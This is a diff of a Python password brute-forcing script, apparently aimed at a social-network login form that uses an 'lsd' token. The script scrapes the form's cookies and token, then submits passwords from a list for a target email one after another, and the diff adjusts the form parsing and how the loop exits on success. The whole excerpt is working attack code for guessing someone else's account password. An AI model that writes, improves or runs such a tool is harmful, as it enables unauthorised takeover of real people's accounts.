@@ -2,6 +2,7 @@ import os.path
 import requests
 from bs4 import BeautifulSoup
 import sys
+import time
 
 if sys.version_info[0] != 3:
     print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
@@ -25,9 +26,13 @@ def create_form():
     data = requests.get(POST_URL, headers=HEADERS)
     for i in data.cookies:
         cookies[i.name] = i.value
-    data = BeautifulSoup(data.text, 'html.parser').form
-    if data.input['name'] == 'lsd':
-        form['lsd'] = data.input['value']
+
+    soup = BeautifulSoup(data.text, 'html.parser')
+    form_tag = soup.find('form')
+
+    if form_tag and form_tag.input['name'] == 'lsd':
+        form['lsd'] = form_tag.input['value']
+
     return form, cookies
 
 
@@ -59,4 +64,5 @@ if __name__ == "__main__":
             continue
         print("Trying password [", index, "]: ", password)
         if is_this_a_password(email, index, password):
-            break
+            time.sleep(5)  # Wait for 5 seconds before exiting
+            sys.exit(0)
